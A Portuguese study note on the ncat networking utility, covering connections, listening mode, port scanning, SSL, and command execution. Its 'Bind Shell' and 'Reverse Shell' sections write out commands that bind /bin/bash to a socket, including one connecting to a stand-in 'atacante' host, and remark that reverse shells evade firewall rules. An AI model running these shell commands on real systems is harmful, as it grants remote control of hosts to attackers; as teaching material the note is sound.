Versão aprimorada do `netcat`, utilitário conhecido como "canivete suíço" de redes. Permite realizar diversas ações que envolvam os protocolos [[5. UDP]] e [[5. TCP]] como port scanning, estabelecer conexões e até servir como servidor (modo listening). A versão `ncat` é uma versão mais moderna e consegue lidar com criptografia SSL.

# Conectar a um serviço

```shell
#         [host/ip]   [port]
$ ncat -v google.com    80
# -v: modo verboso
```

```shell
$ ncat -nv 142.250.79.206 80
# -n: desativa resolução de serviço e hostname. Evita consultas ao DNS e não tenta deduzir o serviço pela porta
```

Mensagens enviadas no terminal serão redirecionadas para o socket conectado. Isso é útil em cenários que a porta aberta da acesso à um shell ou à um serviço em que o protocolo seja via mensagens de texto ([[5. HTTP]], [[5. FTP]] etc). É possível redirecionar a saída (conteúdo enviado pelo servidor) fazendo redirecionamento de stream, exemplo `ncat host port > output`
# Modo listening (servidor)

Com opção `-l` você coloca o `ncat` em modo **listening**: 

```shell
$ ncat -vl -p 3030
# -l: modo listening
# -p: porta em que o servidor escutará
```

> [!info] Redirecionamento de entrada
> O servidor pode enviar bytes para quem se conectar à ele, fazendo um redirecionamento de stream de entrada, por exemplo `ncat -lp 3030 < ./intput`. De tal modo, se o cliente conectado estiver fazendo um redirecionamento de stream de saída, ele poderá baixar o arquivo enviado, por exemplo `ncat host port > ./output`.

# Port scanning

A opção `-z` habilita o modo de **zero I/O**. Nesse modo, as conexões são encerradas assim que o **3WHS** é completado (se for possível fazer a conexão) sem possibilitar recebimento ou envio de dados.

```shell
$ ncat -nvz 172.16.1.50 80
```

```shell
#                     [range de portas]
$ ncat -nvz 172.16.1.50    21-25
```

# Execução de comandos e Shell

As opções `-e` e `-c` suportam execuções de comandos após uma conexão ser estabelecida. **A entrada e saída do processo executado se ligam ao socket conectado**. Isso significa que qualquer comando enviado através socket conectado irá para a entrada padrão do binário, assim como a saída padrão do binário será redirecionada para o socket conectado.

Existe uma diferença sutil entre `-e` e `-c`:

- `-e`: recebe o caminho de um binário a ser executado. Este binário pode ser, por exemplo, `/bin/ls`, `/bin/pwd` e até mesmo `/bin/bash`. Executar o shell permite que o socket conectado execute comandos remotamente (os dados enviados são direcionados para a entrada do `/bin/bash` e sua saída retorna ao socket).

- `-c`: usa o shell para executar comandos. Isso permite maior flexibilidade, pois aceita operações como `pipe` e comandos do shell, por exemplo `-c 'echo "olá mundo\nhello world" > file && cat file | grep "mundo"'`. Por se tratar de comandos do shell, é possível, inclusive, executar o binário do shell (`/bin/sh`), fazendo com que o socket conectado consigo executar comandos remotamente.

A diferença, basicamente, é que o `-e` espera receber o caminho de um binário para ser executado, enquanto o `-c` executa o próprio shell, dando liberdade para fazer uma variedade de coisas. 

## Bind Shell

A técnica de [[11. Bind Shell]] é fazer com que um host abra uma porta em modo listening para receber por conexões, enviando seu shell à qualquer um que se conecte à esta porta:

```shell
# host alvo
$ ncat -lp 3030 -e "/bin/bash"
```

```shell
# host atacante
$ ncat target 3030
pwd
uid=0(root) gid=0(root) groups=0(root)
```

## Reverse Shell

Diferente do bind shell, no [[5. Reverse Shell]] o host atacante abre uma porta enquanto o host alvo inicia a conexão. Com isso é possível burlar algumas regras de firewall que poderiam interceptar pacotes enviados do atacante ao alvo, pois agora é o alvo que está enviando pacotes ao atacante.

```shell
# host atacante
$ ncat -lp 3030
pwd
uid=0(root) gid=0(root) groups=0(root)
```

```shell
# host alvo
$ ncat atacante 3030 -e "/bin/bash"
```


# Habilitar criptografia SSL

Há duas formas de fazer isso, mas em ambos os casos toda e qualquer conexão será encriptada:

1. Gerar uma chave privada e certificado. Para isso, veja [[13. openssl#Geração de certificado X.509|Geração de certificado X.509]].
```shell
$ ncat -lp 3030 --ssl-key key.pem --ssl-cert cert.pem
```
Nessa forma você tem mais controle sobre o tipo de criptografia usada na chave e gerenciamento do certificado gerado, inclusive é perfeitamente possível enviar o certificado para que seja assinado por uma Certificate Authority (CA), dando mais credibilidade para seu certificado.

2. Usar uma chave e certificados gerados em memória pelo `ncat`:
```shell
$ ncat -lp 3030 --ssl
```
Essa forma é útil para testes rápidos em que as conexão precisam ser criptografadas. Por ser auto assinado, o certificado apenas indica que a conexão está criptografada, mas possui pouquíssima credibilidade.
